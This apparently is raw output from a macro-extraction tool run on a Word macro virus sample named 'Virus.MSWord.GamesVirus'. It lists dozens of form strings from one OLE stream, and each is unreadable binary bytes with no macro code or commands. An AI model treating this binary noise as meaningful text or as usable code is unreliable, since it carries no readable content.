VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qmZo�����������������������传��ӧ಼�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���q��������䩿�����䩹��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������೅����������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�����������|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�ma�ſ�ڿ���������������������ӵ������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������W������䡅w�š��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�����幷����~�����濼����秳���������������酓�������������������������d����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WUja��ɿ����������������������������͵���������������ο���ǡ�������鵬��������Ω�γ��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������ﵳ酙���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fw��ÿ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n����������|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zmzoj��ܿǿ��������������������������೵�����ݿ����ҿ����Ϳ���{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ο�����ǿ��²�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w���q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������酙���������������������ټ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qjyjmY��������������������������������ೳ�����������¿����������t���������������u}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}�������ೳೳ�����������ﶅ��������|�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MQjaZQ����ǽ��������������������������ͳ������������¿������������q��͵�����ͳ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q����������������������鳶��酓������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qZyyU���������ɿ����������������������������������ٽǡ�嬧���������ͧͧ�����Ӹӵ������t�����qqqq���������鶶鶝�ﶅ������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tammZ/ӽ�������ɿ��������������ʿ���پ���������������Ρ����С��E�����͛�ͧ����ճ����ӵt�����uqqqq��泵������鳳��අ����������n�������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 














































-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tVmZyZyۿ������ɿ����������������������������������ھΡu�ͬӡ�������o�oy��������ͷ�������ͦ������q�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������鵳������������|Y666CC4466466666=========<=HOOOHOOOOOSSSSSSSSSSSSSSSSSSYSSSSSSSYYSOS^OOSSSOORH]HTXCC\\ffffff\\\XT{^������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ttmyyoo����������������������������������������������Ρ������������������y�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q��������������������酅�鳳೵����t�������������������������Y������UYU�����p��|�|||��o�qWWWu�ttt��������������ﵵ���|�����p����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�ZUYoZ�ɿǿҿ������������������������������������Ҿ���ɿ�ǿ͵���������z�������������ͧ����t�t�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������鶅����������������������������������������������������������y������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������鍏����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tEEtmjyo������������������������������������������������ɿ��Ρӵ����~�z~v�~������u~��������Чttt�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
酅����t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u�����������������������������������������������������q�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t3��Eojy���������������������������������������������ٽοɿο���Ӭ�鉳��q�o����������������ӆ�tt���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��酅������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������q�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tF���mmYo����ǿ������������������������������������������ʿǿ������������o���t��q������ͳ��Ņ�t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��鳶������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������������������o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WMPFVyyy��������Ҳ�������������������������������������Ρ�ο������q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q��Z�u�������Ԭ����t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鳅����鶶��酅���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������qW�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qMFFuZyo�ڿǿ��ؽ���������������������������������������οп���u�qqn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~����Z���������ӵ���t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鶅��鶶�������������������������������������������������������������y�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������o�oqWq�qu���q������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FMVI�Upjoп�ǿ�������������������������������������ؽ�;����³�q��Wc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������q���t�t��tt�����鶶�����酅鷅��������������������������������������������������|oo�u}u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鵧��Qyqqqqquu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qMP)EZZ^yƿ��������������������������������������ӳ������ǚ�����qooooo�駧��q}����ӳ���������t����鳶
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����鳅������������������������������������������������������|�yy���u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y���qoooquu�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WFP3Wq^V�����������������������������������������ٳžج�Śǚ�������������q��y���Ӧͱ�������tt��醅��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������酅������������������������������������������������������yotq�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������Wt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y����yyoy�Wut����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tMMMIVm^Qj���ǿ�����������������������������������������Ÿ�䚿y���������������������ӓ�������������酅��鳳�����ly���������������������������������������������������ot}��Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������ut�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o����oooyWu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MWqMMLQm^�ο���ǿ�ج������������������������������������·ͬ�����t������������͵�雳��tu������酶������鶶��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����`y����������������Ţ�������������������������������ooq�o���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������tut�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����y��}}ooyouq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EtWMFF//BZ��������������������������ߵ���ಳ������о��Ŝxxxx�t����u����Ͳ���ͧ��ͳ����t��鶅�������������酅�s�������������������������������������������������ooqj�su�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������t�����tt����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qy}�}�o�yo��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tEMtWPP/mj��������������۬����������������������������xxxx����͵�q���������������馵�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����鵅����������ov��u�����������������������������������������������qq�Qjea
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������ﷅ����uy���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}}}�oooo�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���EtFVVIPZy�ǽ����������������������鳳�����������ͬ����°�͵�ty���s������������������ͳ鳳�������ͅ��鳳�����鳥v�������������������������������������������������o��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������󶅆ttqy���q�������鵋}}�oyyoW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ett3IIVBZ�ӽ��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ͳ�����ŴŴś����Ӭ����������������͛������酅��������������鳳v��������������������������������{���������������oqq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������鶶to���ouWWq酅�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���y}���o�oqu��u�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����EMMPI/VZj��δ��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������Ũ�t���ͳ��͠���������ͬ���۳�ﳳ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����鳳鳳���������q�d������������������������������������������������oo�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������ZyouWqqq�慅����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qY��Zyoyu�����������W���u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����MWP)+ZVy�Ž�����������������������۳�������泳��������ͧ�͵o���q�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����鳳�鳳���y�vZ�t��������������������������������������������o�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������qqqqqW���t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���qqq����t�������tt�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����ttWWqWqm�����������������������������������������������ͦ�ooy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����ߵ������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
